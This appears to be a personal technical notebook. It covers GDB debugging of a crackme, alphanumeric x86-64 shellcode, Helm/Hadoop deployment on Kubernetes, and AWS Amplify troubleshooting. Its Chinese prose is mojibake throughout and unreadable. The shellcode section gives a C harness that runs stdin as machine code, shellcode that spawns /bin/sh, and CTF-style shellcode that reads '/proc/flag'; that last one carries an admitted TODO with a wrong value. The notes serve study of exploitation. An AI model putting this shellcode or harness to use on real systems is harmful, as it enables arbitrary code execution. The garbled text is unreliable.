+   0x080486dd &lt;+58&gt;:    call   0x8048420 &lt;strcmp@plt&gt;
    0x080486e2 &lt;+63&gt;:    add    esp,0x8
   ...
</code></pre>
<p>åˆ™å¯ä»¥åœ¨ <code>call strcmp</code> å¤„æ–­ç‚¹ã€‚</p>
<pre><code class="language-bash">(gdb) b *0x080486dd
Breakpoint 2 at 0x80486dd: file crackme.c, line 15.
</code></pre>
<p>æˆ–è€…ä¹Ÿå¯ä»¥ç”¨ç›¸å¯¹ <code>main</code> çš„åç§»ï¼ˆoffsetï¼‰æ¥æ–­ç‚¹ã€‚</p>
<pre><code class="language-bash">(gdb) b *main+58
</code></pre>
<p>ç¨‹åºè¿è¡Œåˆ°æ–­ç‚¹æ—¶ä¼šåœæ­¢ï¼Œè¿™æ—¶å¯ä»¥æŸ¥çœ‹æ±‡ç¼–ã€å¯„å­˜å™¨å€¼ç­‰æ“ä½œã€‚</p>
<pre><code class="language-bash">(gdb) r
Starting program: /path/to/crackme
Breakpoint 1, main (argc=1, argv=0xffffd6c4) at crackme.c:9
</code></pre>
<p>å¯ä»¥ä½¿ç”¨ <code>info breakpoint</code> æˆ–è€… <code>i b</code> æŸ¥çœ‹å½“å‰æ‰€æœ‰çš„æ–­ç‚¹ã€‚åˆ é™¤æ–­ç‚¹åˆ™æ˜¯ç”¨ <code>delete &lt;breakpoint number&gt;</code> æˆ– <code>d &lt;breakpoint number&gt;</code>ã€‚</p>
<h2 id="æŸ¥çœ‹æ±‡ç¼–å¯„å­˜å™¨å€¼å˜é‡å€¼"><a class="header" href="#æŸ¥çœ‹æ±‡ç¼–å¯„å­˜å™¨å€¼å˜é‡å€¼">æŸ¥çœ‹æ±‡ç¼–ã€å¯„å­˜å™¨å€¼ã€å˜é‡å€¼</a></h2>
<h3 id="æ±‡ç¼–"><a class="header" href="#æ±‡ç¼–">æ±‡ç¼–</a></h3>
<p><code>disassemble</code> æˆ– <code>disas</code> å¯ä»¥æŸ¥çœ‹ <em>å½“å‰</em> æ ˆå¸§ï¼ˆframeï¼‰çš„æ±‡ç¼–ã€‚æ¯”å¦‚åˆšæ‰åœ¨ <code>main</code> å¤„æ‰“äº†æ–­ç‚¹ï¼Œå°±èƒ½å¤ŸæŸ¥çœ‹ <code>main</code> çš„æ±‡ç¼–ã€‚</p>
<pre><code class="language-bash">(gdb) disas
Dump of assembler code for function main:
   0x08048486 &lt;+0&gt;:     push   ebp
   0x08048487 &lt;+1&gt;:     mov    ebp,esp
   0x08048489 &lt;+3&gt;:     sub    esp,0x4
   ...
</code></pre>
<p>æ±‡ç¼–æ ¼å¼é»˜è®¤æ˜¯ AT&amp;T, ä¸æƒ³çœ‹ AT&amp;T çš„é˜´é—´æ±‡ç¼–çš„è¯è¦æå‰è®¾ç½® assembly flavorã€‚</p>
<pre><code class="language-bash">(gdb) set disassembly-flavor intel
</code></pre>
<p>å¸¦ä¸Š <code>/m</code> å‚æ•°å¯ä»¥æŠŠæºç å’Œæ±‡ç¼–ä¸€èµ·æ’åˆ—ï¼ˆå¦‚æœæœ‰æºç çš„è¯ï¼‰ï¼Œæ²¡æœ‰ä¹Ÿèƒ½æ˜¾ç¤ºä¸€ç»„æ±‡ç¼–å¯¹åº”çš„ c ç¨‹åºè¡Œå·ï¼Œæ‰“æ–­ç‚¹æ›´æ–¹ä¾¿ä¸€äº›ã€‚</p>
<pre><code class="language-bash">(gdb) disas /m
Dump of assembler code for function main:
7       in crackme.c
   0x08048486 &lt;+0&gt;:     push   ebp
   0x08048487 &lt;+1&gt;:     mov    ebp,esp
   0x08048489 &lt;+3&gt;:     sub    esp,0x4
   ...
</code></pre>
<h3 id="å¯„å­˜å™¨"><a class="header" href="#å¯„å­˜å™¨">å¯„å­˜å™¨</a></h3>
<p>å¯ä»¥ä½¿ç”¨ <code>info register</code> æˆ–ç¼©å†™ <code>i r</code> æŸ¥çœ‹å¯„å­˜å™¨å€¼ã€‚å¯èƒ½æ˜¯æœ€å¸¸ç”¨çš„æ“ä½œäº†ã€‚</p>
<pre><code class="language-bash">(gdb) i r
eax            0xf7fbcdd8       -134492712
ecx            0xfcf63fa0       -50970720
edx            0xffffd654       -10668
ebx            0x0      0
esp            0xffffd624       0xffffd624
ebp            0xffffd628       0xffffd628
esi            0xf7fbb000       -134500352
edi            0x0      0
eip            0x804848c        0x804848c &lt;main+6&gt;
eflags         0x286    [ PF SF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
</code></pre>
<h3 id="å˜é‡"><a class="header" href="#å˜é‡">å˜é‡</a></h3>
<p>å¦‚æœä½ çŸ¥é“å˜é‡åï¼Œå¯ä»¥ç”¨ <code>print var</code> æˆ– <code>p var</code> æ‰“å°å…¶å†…å®¹ï¼Œä¹Ÿå¯ä»¥æ‰“å°å¯„å­˜å™¨å†…å®¹ã€‚</p>
<p>æ¯”å¦‚æ‰“å° <code>argv[0]</code> ï¼ˆç¨‹åºåï¼‰</p>
<pre><code class="language-bash">(gdb) p argv[0]
$1 = 0xffffd7f4 &quot;/path/to/crackme&quot;
</code></pre>
<p>æ³¨æ„åˆ° <code>print</code> æœ‰ä¸€ä¸ªè‡ªå¢ idï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>print $id</code> æ¥æ‰“å°ä¹‹å‰æ‰“å°è¿‡çš„å€¼ã€‚</p>
<pre><code class="language-bash">(gdb) p $1
$2 = 0xffffd7f4 &quot;/path/to/crackme&quot;
</code></pre>
<p><code>x address</code> å¯ä»¥ç”¨æ¥æ£€è§†å†…å­˜å†…å®¹ï¼Œæ¯”å¦‚ <code>x $eax</code> ä¼šæŠŠ <code>%eax</code> ä¸­å­˜å‚¨çš„å€¼è§£è¯»ä¸ºå†…å­˜åœ°å€ï¼Œå¹¶æ‰“å°å…¶å†…å®¹ã€‚</p>
<p><code>p</code> å’Œ <code>x</code> å¯ä»¥ç”¨åŸºæœ¬ç›¸åŒçš„ä¸€å¥—æ ¼å¼åŒ–æ–¹æ³•æ¥æŒ‡å®šè¦æ‰“å°å˜é‡ / å†…å­˜åœ°å€è¢«è§£è¯»ä¸ºä½•ç§ç±»å‹ã€‚</p>
<ul>
<li><code>/o</code>ï¼š8 è¿›åˆ¶ï¼ˆoctalï¼‰</li>
<li><code>/x</code>ï¼š16 è¿›åˆ¶ ï¼ˆhexadecimalï¼‰</li>
<li><code>/u</code>ï¼šæ— ç¬¦å· 10 è¿›åˆ¶ï¼ˆunsigned decimalï¼‰</li>
<li><code>/t</code>ï¼šbinary</li>
<li><code>/f</code>ï¼šfloating point</li>
<li><code>/a</code>ï¼šaddress â€”â€” è¿™ä¸è¿˜æ˜¯ 16 è¿›åˆ¶å— =ã€=</li>
<li><code>/c</code>ï¼šchar</li>
<li><code>/s</code>ï¼šstring</li>
</ul>
<p><code>x</code> æ¨¡å¼è¿˜å¯ä»¥ç”¨ <code>/i</code> é‡‡ç”¨æŒ‡ä»¤ï¼ˆinstructionï¼‰æ ¼å¼åŒ–æ–¹æ³•ã€‚åœ¨æ Buffer Overflow çš„æ—¶å€™æŸ¥çœ‹å†™è¿›æ ˆå†…çš„ shellcode å¼‚å¸¸å¥½ç”¨ã€‚</p>
<pre><code class="language-bash">(gdb) x/7i 0xfffd6b0
  0xffffd6b0    add    ecx, esp
  0xffffd6b2    push   ecx
  0xffffd6b3    mov    ecx, esp
  0xffffd6b5    xor    edx, edx
  0xffffd6b7    push   0
-&gt;0xffffd6b9    sar    bl, 1
  0xffffd6bb    test   dword ptr [eax], 0
</code></pre>
<p><code>x</code> è¿˜èƒ½æŒ‡å®šå­—ç¬¦ä¸²çš„å­—ç¬¦å®½åº¦ï¼ˆè­¬å¦‚ UTF-16le æˆ– UTF-8 å­—ç¬¦å®½åº¦å°±å¯èƒ½ä¸º 2 æˆ– 3 ä¸ªå­—èŠ‚ï¼‰ã€‚</p>
<ul>
<li><code>b</code>: byte</li>
<li><code>h</code>: halfword (16-bit value)</li>
<li><code>w</code>: word (32-bit value)</li>
<li><code>l</code>: giant word (64-bit value)</li>
</ul>
<p>æ¥çœ‹çœ‹æ‰“å°æ•ˆæœï¼š</p>
<pre><code class="language-bash">(gdb) x/bs 0x8048817
0x8048817:      &quot;250381&quot;
(gdb) x/ws 0x8048817
0x8048817:      U&quot;\x33303532\x50003138\x77737361\x2064726f\x3a204b4f\x616c0029\x3a313062\x6f747574\x6c616972\x766e4900\x64696c61\x73615020\x726f7773â…¤\x31b0100ä€»Ü€\xfffbc000çƒ¿\xfffc8000é“¿\xfffcd000å³¿\xfffda600\xa8ff\xfffe5300ì£¿\xfffed000î£¿\xffff3000\x134ffá€&quot;
(gdb) x/hs 0x8048817
0x8048817:      u&quot;ã”²ãŒ°ã„¸å€€ç¡ç³ç‰¯â¤ä­ã¨ )æ…¬ã¢ã¨±ç•´æ½´æ¥²æ±¡ä¤€ç™®æ±¡æ‘©å€ ç¡ç³ç‰¯â…¤&quot;
(gdb) x/ls 0x8048817
0x8048817:      &quot;250381&quot;
</code></pre>
<h3 id="å…¶ä»–"><a class="header" href="#å…¶ä»–">å…¶ä»–</a></h3>
<p>å¦‚æœæƒ³è¾¹çœ‹æ±‡ç¼–è¾¹è°ƒè¯•çš„è¯ï¼Œå¯ä»¥ç”¨ <code>layout asm</code> æ˜¾ç¤ºæ±‡ç¼–å’Œå‘½ä»¤è¡Œã€‚</p>
<pre><code class="language-bash">(gdb) layout asm
</code></pre>
<p>æ•ˆæœå¦‚å›¾ï¼š</p>
<p><img src="RevEng/img/2020-12-25-12-58-23.png" alt="layout asm" /></p>
<p>æƒ³è¦é€€å‡º <code>layout</code> æ¨¡å¼åªéœ€ <code>Ctrl</code> + <code>X, A</code> ï¼ˆæŒ‰ä½ <code>Ctrl</code> + <code>X</code> åå†æŒ‰ <code>A</code>ï¼Œç±»ä¼¼ VSCode çš„ <code>Ctrl + K, *</code> ç³»åˆ—æ“ä½œï¼‰ã€‚</p>
<p><code>layout</code> é™¤äº†æ˜¾ç¤ºæ±‡ç¼–ï¼Œè¿˜å¯ä»¥æ˜¾ç¤ºå…¶ä»–å†…å®¹ã€‚å…·ä½“å‚æ•°å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>src</code>   : Displays source and command windows.</li>
<li><code>asm</code>   : Displays disassembly and command windows.</li>
<li><code>split</code> : Displays source, disassembly and command windows.</li>
<li><code>regs</code>  : Displays register window. If existing layout</li>
</ul>
<h2 id="æŒ‰æ­¥è°ƒè¯•"><a class="header" href="#æŒ‰æ­¥è°ƒè¯•">æŒ‰æ­¥è°ƒè¯•</a></h2>
<p><code>continue</code> æˆ–ç¼©å†™ <code>c</code> å¯ä»¥è®©ç¨‹åºè¿è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ã€‚</p>
<p><code>next</code> æˆ– <code>n</code> å¯ä»¥è®©ç¨‹åºè¿è¡Œåˆ° <em>å½“å‰æ ˆå¸§</em> çš„ä¸‹ä¸€æ¡è¯­å¥ã€‚åœ¨é‡åˆ°å‡½æ•°è°ƒç”¨æ—¶ï¼Œ<code>next</code> <strong>ä¸ä¼š</strong>è·Ÿè¸ªè¿›å…¥å‡½æ•°ã€‚</p>
<p><code>step</code> æˆ– <code>s</code> å¯ä»¥è®©ç¨‹åºè¿è¡Œåˆ°ä¸‹ä¸€æ¡è¯­å¥ã€‚åœ¨é‡åˆ°å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œ<code>step</code> <strong>ä¼š</strong>è·Ÿè¸ªè¿›å…¥å‡½æ•°ã€‚</p>
<p><code>nexti</code> å’Œ <code>stepi</code> ä¸ä¸å¸¦ <code>i</code> çš„æŒ‡ä»¤ç±»ä¼¼ï¼ŒåŒºåˆ«æ˜¯ä»–ä»¬ä¼šè®©ç¨‹åºè¿è¡Œåˆ°ä¸‹ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤ï¼ˆ<code>i</code> æŒ‡ instructionï¼‰ã€‚</p>
<h2 id="tips"><a class="header" href="#tips">Tips</a></h2>
<p>è§‰å¾—åœ¨ GDB é‡Œçœ‹æ±‡ç¼–å¤ªç´¯çš„è¯å¯ä»¥ <code>objdump</code> æ•´ä¸ªæ–‡ä»¶ï¼Œåœ¨å–œæ¬¢çš„ç¼–è¾‘å™¨é‡Œå¸¦ç€é«˜äº®æ…¢æ…¢çœ‹ã€‚ Sublime Text 3 æ¨è NASM x86 Assembly è¿™ä¸ªé«˜äº®ã€‚</p>
<pre><code class="language-bash">$ objdump -M intel -d crackme &gt; crackme.asm
</code></pre>
<p>ä½¿ç”¨ <code>pwndbg</code> è¿™ä¸ª GDB æ’ä»¶å¯ä»¥æŠŠå·¥ä½œé‡ï¼ˆæŒ‡è®°ä½ GDB å‘½ä»¤ï¼‰å‡å°‘å¾ˆå¤šã€‚åœ¨æ¯æ¬¡è¿è¡Œåˆ°æ–­ç‚¹æ—¶ <code>pwndbg</code> éƒ½ä¼šæŠŠå¯èƒ½éœ€è¦çš„ä¿¡æ¯æ¼‚äº®åœ°æ‰“å‡ºæ¥</p>
<p><img src="RevEng/img/2020-12-25-13-14-06.png" alt="pwndbg" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="alphanumeric-shellcode"><a class="header" href="#alphanumeric-shellcode">Alphanumeric shellcode</a></h1>
<p>Alphanumeric shellcode é™å®šæ‰€ä½¿ç”¨çš„æ±‡ç¼– opcode åªèƒ½åœ¨ <code>0x20</code> ~ <code>0x7f</code> èŒƒå›´å†…â€”â€”è¿™æ­£æ˜¯â€œäººç±»å¯è¯»â€çš„ ascii å­—ç¬¦çš„èŒƒå›´ã€‚æ‰€ä»¥å¦‚æœä½ ç”¨å¦‚ä¸‹ä»£ç ç¼–è¯‘å‡ºä¸€ä»½å­—èŠ‚æ–‡ä»¶ï¼Œä½ å°†å¾—åˆ°ä¸€ä»½çœ‹èµ·æ¥åƒä¹±ç æ–‡æœ¬ï¼Œä½†å®é™…ä¸Šåˆå¯æ‰§è¡Œçš„æ€ªä¸œè¥¿ï¼</p>
<pre><code class="language-bash">gcc -m64 -c -o shellcode.o shellcode.S
objcopy -S -O binary -j .text shellcode.o shellcode.ascii
</code></pre>
<p>ä¸‹é¢æˆ‘ä»¬ç ”ç©¶ä¸€ä¸‹ï¼Œå¦‚ä½•ä¹¦å†™ä¸€ä»½ <code>x86-64</code> é£æ ¼çš„ alphanumeric shellcodeã€‚</p>
<h2 id="é™åˆ¶ä¸é—®é¢˜"><a class="header" href="#é™åˆ¶ä¸é—®é¢˜">é™åˆ¶ä¸é—®é¢˜</a></h2>
<p>WIP</p>
<h2 id="æ¼”ç¤º-shellcode-æ‰§è¡Œ"><a class="header" href="#æ¼”ç¤º-shellcode-æ‰§è¡Œ">æ¼”ç¤º shellcode æ‰§è¡Œ</a></h2>
<p>ç›´æ¥æŠŠä¼ å…¥çš„ shellcode è¯»åˆ° <code>buf</code> ä¸­å¹¶ä¸”å°† <code>buf</code> è§£é‡Šä¸ºå‡½æ•°æŒ‡é’ˆæ‰§è¡Œ <code>buf</code>ã€‚</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;err.h&gt;
#include &lt;stdlib.h&gt;

char buf[2048];

int main()
{
  if (!fgets(buf, sizeof(buf), stdin))
    err(1, &quot;Too long input&quot;);

  // a few info for debugging
  printf(&quot;&gt; length: %d\n&quot;, (int)strlen(buf));
  for (int i = 0; i &lt; strlen(buf); i += 1) {
    if (i % 16 == 0)
      printf(&quot;&gt; %04X: &quot;, i);
    printf(&quot;%02X &quot;, (unsigned char)buf[i]);
    if (i % 16 == 15)
      printf(&quot;\n&quot;);
  }
  printf(&quot;\n&quot;);

  (*(void (*)()) buf)();
}
</code></pre>
<h2 id="shellcode"><a class="header" href="#shellcode">shellcode</a></h2>
<pre><code class="language-assembly"> .global _start
        .text
_start:
        ; Set %rcx as stack pointer
        ; and align %rsp
        push $0x5a
        push %rsp
        pop %rcx
        pop %rax

        ; Get magic offset and store in %rdi
        xor $0x55, %al
        push %rax                       ; 0x14 on the stack now.
        pop %rax                        ; add back to %esp
        imul  $0x41, (%rcx), %edi       ; %rdi = 0x3cf, a &quot;magic offset&quot; for us
                                        ; This is decimal value 975.
                                        ; If this is too low/high, suggest a
                                        ; modification to xor of %al for
                                        ; changing the imul results

        ; Write the syscall
        movslq (%rcx,%rdi,1), %rsi
        xor %esi, (%rcx,%rdi,1)         ; 4 bytes have been nulled
        push $0x3030474a
        pop %rax
        xor $0x30304245, %eax
        push %rax
        pop %rax                        ; Garbage reg
        movslq (%rcx), %rsi
        xor %esi, (%rcx,%rdi,1)

        ; Sycall written, set values now.
        ; allocate 8 bytes for '/bin/sh\0'
        movslq 0x30(%rcx), %rsi
        xor %esi, 0x30(%rcx)
        movslq 0x34(%rcx), %rsi
        xor %esi, 0x34(%rcx)

        ; Zero rdx, rsi, and rdi
        movslq 0x30(%rcx), %rdi
        movslq 0x30(%rcx), %rsi
        push %rdi
        pop %rdx

        ; Store '/bin/sh\0' in %rdi
        push $0x5a58555a
        pop %rax
        xor $0x34313775, %eax
        xor %eax, 0x30(%rcx)            ; '/bin'  just went onto the stack

        push $0x6a51475a
        pop %rax
        xor $0x6a393475, %eax
        xor %eax, 0x34(%rcx)            ; '/sh\0' just went onto the stack
        xor 0x30(%rcx), %rdi            ; %rdi now contains '/bin/sh\0'

        pop %rax
        push %rdi

        push $0x58
        movslq (%rcx), %rdi
        xor (%rcx), %rdi                ; %rdi zeroed
        pop %rax
        push %rsp
        xor (%rcx), %rdi
        xor $0x63, %al
</code></pre>
<pre><code class="language-assembly">#include &lt;sys/syscall.h&gt;

.globl main
.type main, @function

main:

    /* PART I : OPEN */
    /* start of buf 0x6020c0 */
    /* about 100 bytes long! */
    /* Set rcx as stack pointer */
    push $0x58
    push %rsp
    pop %rcx
    pop %rax

    /* rdx = 0x6020c0, start of buf*/
    movslq 0x50(%rcx), %rax
    push $0x30585040
    pop %rax
    xor $0x30387140, %rax
    push %rax
    pop %rdx

    /* Write the syscall to designated place */
    push $0x30302847
    pop %rax
    xor $0x30307522, %eax            /* 0x602100 */
    push %rax
    pop %rax                        /* Garbage reg */
    movslq (%rcx), %rsi
    xor %esi, 0x5b(%rdx)

    /* Sycall written, set values now.
     allocate 16 bytes for '/proc/flag\0' */
    movslq 0x50(%rcx), %rsi
    xor %esi, 0x50(%rcx)
    movslq 0x54(%rcx), %rsi
    xor %esi, 0x54(%rcx)
    movslq 0x58(%rcx), %rsi
    xor %esi, 0x58(%rcx)
    movslq 0x5c(%rcx), %rsi
    xor %esi, 0x5c(%rcx)

    /* Zero rdx, rsi, and rdi */
    movslq 0x50(%rcx), %rdi
    movslq 0x50(%rcx), %rsi
    push %rdi
    pop %rdx

    /* Store '/bin/sh\0' in %rdi */
    push $0x31315039
    pop %rax
    xor $0x31313758, %eax
    xor %eax, 0x58(%rcx)            /* 'ag\0\0'  just went onto the stack */

    push $0x58575a3b
    pop %rax
    xor $0x34317558, %eax
    xor %eax, 0x54(%rcx)            /* 'c/fl' just went onto the stack */

    push $0x5b43475a
    pop %rax
    xor $0x34313775, %eax
    xor %eax, 0x50(%rcx)           /* /pro just went onto the stack*/
    xor 0x50(%rcx), %rdi
    xor 0x58(%rcx), %rsi

    pop %rax
    pop %rax
    push %rsi
    push %rdi

    push $0x58
    movslq (%rcx), %rsi
    xor (%rcx), %rsi                /* %rsi zeroed */
    movslq (%rcx), %rdi
    xor (%rcx), %rdi                /* %rdi zeroed */
    pop %rax
    push %rsp
    xor $0x5a, %al
    xor (%rcx), %rdi               /* From here, rdi = pointer to /proc/flag */
                                   /* rsi = 0 = read mode */

/* This will be modified to syscall */
    push $0x58

    /***********************************/
    /********** PART2 : READ ***********/
    /***********************************/
    /* eax now has fd, move it to rdi */
    push %rax
    pop  %rdi

    /* rsp in rcx */
    push $58
    push %rsp
    pop  %rcx
    pop %rax

    movslq (%rcx), %rsi
    xor %esi, (%rcx)
    movslq (%rcx), %rsi
    xor %esi, (%rcx)

    /* rdx = 0x602060 */
    push $0x61616161
    pop  %rax
    xor  $0x61616161, %eax  /* empty rax */

    push $0x30585058
    pop %rax
    xor $0x30387138, %rax
    push %rax
    pop %rdx

    /* emtpy rax again */
    push $0x61616161
    pop  %rax
    xor  $0x61616161, %eax  /* empty rax */

    /* Write the syscall to designated place */
    push $0x30302847
    pop %rax
    xor $0x30307522, %eax            /* 0x005d65 */
    push %rax
                          /* Garbage reg */
    movslq (%rcx), %rsi
    xor %esi, 0x58(%rdx)

    /* Put 0x100 into %rdx */
    push $0x61616161
    pop %rax
    xor $0x61616061, %eax
    push %rax
    pop %rdx

    push $0x58
    pop %rax
    push %rcx
    pop %rsi
    xor $0x58, %al

/* To be syscall*/
    push $0x58


    /***********************************/
    /********** PART3 : WRITE ***********/
    /***********************************/
    /* rsp in rcx */
    push $0x58
    push %rsp
    pop  %rcx
    pop %rax   /* Garbage */

    /* Set rdx = 0x602200 */
    push $0x61616161
    pop  %rax
    xor  $0x61616161, %eax  /* empty rax */

    push $0x30586858
    pop %rax
    xor $0x30384a58, %rax /* TODO: the value is not correct now */
    push %rax
    pop %rdx

    /* emtpy rax again */
    push $0x61616161
    pop  %rax
    xor  $0x61616161, %eax  /* empty rax */

    /* Write the syscall to designated place */
    push $0x30302847
    pop %rax
    xor $0x30302847, %eax            /* 0x005d65 */
    push %rax
    pop %rax                      /* Garbage reg */
    movslq (%rcx), %rdi
    xor %edi, 0x58(%rdx)

    /* Put 0x100 into %rdx */
    push $0x61616161
    pop %rax
    xor $0x61616561, %eax
    push %rax
    pop %rdx

    push $0x58
    pop %rax
    xor $0x59, %al /* rax set to 1 */
    push %rax
    pop %rdi
    push %rax
    pop %rdi
    push %rax
    pop %rdi
    push %rax
    pop %rdi
    push %rax
    pop %rdi
    push %rax
    pop %rdi

/* To be syscall*/
    push $0x58
</code></pre>
<h2 id="reference-1"><a class="header" href="#reference-1">Reference</a></h2>
<ol>
<li><a href="https://nets.ec/Alphanumeric_shellcode">NetSec: Alphanumeric Shellcode</a></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="åœ¨-kubernetes-é›†ç¾¤éƒ¨ç½²-hadoop"><a class="header" href="#åœ¨-kubernetes-é›†ç¾¤éƒ¨ç½²-hadoop">åœ¨ kubernetes é›†ç¾¤éƒ¨ç½² hadoop</a></h1>
<p>å®é™…ä¸Šè¿™æ˜¯ä¸€ä¸ªå·®çš„æƒ³æ³•ã€‚</p>
<h2 id="ä½¿ç”¨-helm-å®‰è£…"><a class="header" href="#ä½¿ç”¨-helm-å®‰è£…">ä½¿ç”¨ helm å®‰è£…</a></h2>
<h3 id="ä¸‹è½½-helm"><a class="header" href="#ä¸‹è½½-helm">ä¸‹è½½ helm</a></h3>
<pre><code class="language-bash">curl https://baltocdn.com/helm/signing.asc | sudo apt-key add -
sudo apt-get install apt-transport-https --yes
echo &quot;deb https://baltocdn.com/helm/stable/debian/ all main&quot; | sudo tee /etc/apt/sources.list.d/helm-stable-debian.list
sudo apt-get update
sudo apt-get install helm
</code></pre>
<h3 id="create-a-chart"><a class="header" href="#create-a-chart">Create a chart</a></h3>
<pre><code class="language-bash">helm create mychart
</code></pre>
<p>é»˜è®¤çš„ chart æ˜¯ä¸ª <code>nginx</code> web serverã€‚å¯ä»¥éƒ¨ç½²ä¸Šå»çœ‹çœ‹</p>
<h3 id="install-a-chart"><a class="header" href="#install-a-chart">Install a chart</a></h3>
<pre><code class="language-bash">helm install mychart-release-name mychart
</code></pre>
<pre><code class="language-bash">export POD_NAME=$(kubectl get pods --namespace default -l &quot;app.kubernetes.io/name=mychart-release-name,app.kubernetes.io/instance=cluster-name&quot; -o jsonpath=&quot;{.items[0].metadata.name}&quot;)
export CONTAINER_PORT=$(kubectl get pod --namespace default $POD_NAME -o jsonpath=&quot;{.spec.containers[0].ports[0].containerPort}&quot;)
echo &quot;Visit http://127.0.0.1:8080 to use your application&quot;
kubectl --namespace default port-forward $POD_NAME 8080:$CONTAINER_PORT
</code></pre>
<h3 id="uninstall-chart"><a class="header" href="#uninstall-chart">Uninstall chart</a></h3>
<pre><code class="language-bash">$ helm list
NAME                     NAMESPACE       REVISION        UPDATED                                 STATUS          CHART           APP VERSION
mychart-release-name     default         1               2020-12-05 18:53:26.6995927 +0900 KST   deployed        mychart-0.1.0   1.16.0
</code></pre>
<pre><code class="language-bash">helm uninstall mychart-release-name
</code></pre>
<p>Can also be done by <code>delete</code> <code>del</code> <code>un</code>.</p>
<h2 id="install-hadoop-chart"><a class="header" href="#install-hadoop-chart">Install <code>hadoop</code> chart</a></h2>
<p>To install the chart with the release name hadoop that utilizes 50% of the available node resources:</p>
<pre><code class="language-bash">helm install hadoop stable/hadoop
</code></pre>
<p>This command will deploy at least 4 pods on your cluster according to the default settings.</p>
<ol>
<li>hdfs namenode pod</li>
<li>hdfs datanode</li>
<li>yarn resource manager</li>
<li>yarn name manager</li>
</ol>
<h3 id="usage"><a class="header" href="#usage">Usage</a></h3>
<ol>
<li>
<p>You can check the status of HDFS by running this command:</p>
<pre><code class="language-bash">kubectl exec -n default -it hadoop-hadoop-hdfs-nn-0 -- hdfs dfsadmin -report
</code></pre>
</li>
<li>
<p>You can list the yarn nodes by running this command:</p>
<pre><code class="language-bash">kubectl exec -n default -it hadoop-hadoop-yarn-rm-0 -- yarn node -list
</code></pre>
</li>
<li>
<p>Create a port-forward to the yarn resource manager UI:</p>
<pre><code class="language-bash">kubectl port-forward -n default hadoop-hadoop-yarn-rm-0 8088:8088
</code></pre>
<p>Then open the ui in your browser:</p>
<pre><code class="language-bash">open http://localhost:8088
</code></pre>
</li>
<li>
<p>You can run included hadoop tests like this:</p>
<pre><code class="language-bash">kubectl exec -n default -it hadoop-hadoop-yarn-nm-0 -- hadoop jar /usr/local/hadoop/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-2.9.0-tests.jar TestDFSIO -write -nrFiles 5 -fileSize 128MB -resFile /tmp/TestDFSIOwrite.txt
</code></pre>
</li>
<li>
<p>You can list the mapreduce jobs like this:</p>
<pre><code class="language-bash">kubectl exec -n default -it hadoop-hadoop-yarn-rm-0 -- mapred job -list
</code></pre>
</li>
<li>
<p>This chart can also be used with the zeppelin chart</p>
<pre><code class="language-bash">helm install --namespace default --set hadoop.useConfigMap=true,hadoop.configMapName=hadoop-hadoop stable/zeppelin
</code></pre>
</li>
<li>
<p>You can scale the number of yarn nodes like this:</p>
<pre><code class="language-bash">helm upgrade hadoop --set yarn.nodeManager.replicas=4 stable/hadoop
</code></pre>
<p>Make sure to update the values.yaml if you want to make this permanent.</p>
</li>
</ol>
<h2 id="edit-helm-release"><a class="header" href="#edit-helm-release">Edit <code>helm</code> release</a></h2>
<pre><code class="language-bash">helm upgrade -f new-values.yml {release name} {package name or path} --version {fixed-version}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="aws-amplify-è¸©å‘è®°å½•"><a class="header" href="#aws-amplify-è¸©å‘è®°å½•">AWS Amplify è¸©å‘è®°å½•ğŸ•³</a></h1>
<p>æˆ‘ä¹Ÿä¸çŸ¥é“è¿™ç®—ä¸ç®— DevOps</p>
<h2 id="è¯•å›¾ä»-staging-clone-å‡ºä¸€ä¸ªé…ç½®ä¸€æ ·çš„-dev-ç¯å¢ƒ"><a class="header" href="#è¯•å›¾ä»-staging-clone-å‡ºä¸€ä¸ªé…ç½®ä¸€æ ·çš„-dev-ç¯å¢ƒ">è¯•å›¾ä» staging clone å‡ºä¸€ä¸ªé…ç½®ä¸€æ ·çš„ dev ç¯å¢ƒ</a></h2>
<h3 id="è¢«å‘è¿‡ç¨‹"><a class="header" href="#è¢«å‘è¿‡ç¨‹">è¢«å‘è¿‡ç¨‹</a></h3>
<p>Amplify backend å·²æœ‰ stagingï¼Œæƒ³ç›´æ¥å† Amplify Console clone å¤±è´¥äº†ï¼Œ å‡ºæ¥ä¸€ä»½ç©ºçš„ :/</p>
<p>åœ¨æœ¬åœ°æœ‰ staging backend é…ç½®è¡¨çš„åˆ†æ”¯ development ä¸Šæ‹‰å– dev environment:</p>
<pre><code class="language-shell">amplify pull --appId &lt;appId&gt; --envName dev
</code></pre>
<p>ä¹‹åè¿›è¡Œ pushï¼Œæç¤º <code>HostedUIProvidersCustomResourceInputs</code> update å¤±è´¥ã€‚</p>
<pre><code class="language-shell">Embedded stack arn:aws:cloudformation:&lt;myapp&gt; was not successfully updated. Currently in UPDATE_ROLLBACK_IN_PROGRESS with reason: The following resource(s) failed to update: [HostedUIProvidersCustomResourceInputs].
</code></pre>
<p>è°·æ­Œåˆ° <a href="https://github.com/aws-amplify/amplify-cli/issues/3798">è¿™ä¸ª issue</a>ï¼Œæç¤ºå¯èƒ½æ˜¯ <code>tream-provider-info.json</code> é‡Œç¼º <code>auth</code> å†…å®¹ã€‚çœ‹äº†ä¸€ä¸‹æœç„¶æ˜¯ç©ºçš„ã€‚</p>
<p>åœ¨ JSON é‡Œæ·»åŠ  <code>auth</code> ç›¸å…³å­—æ®µã€‚</p>
<pre><code class="language-json">{
  ...
  &quot;categories&quot;: {
      &quot;auth&quot;: {
        &quot;&lt;appName&gt;&quot;: {
          &quot;userPoolId&quot;: &quot;...&quot;,
          &quot;userPoolName&quot;: &quot;...&quot;,
          &quot;webClientId&quot;: &quot;...&quot;,
          &quot;nativeClientId&quot;: &quot;...&quot;
        }
      }
    }
}
</code></pre>
<p>å†æ¬¡ <code>amplify push</code>ï¼Œ æç¤º <code>[webClientId, nativeClientId, userPooId] does not exist in the template</code>ã€‚</p>
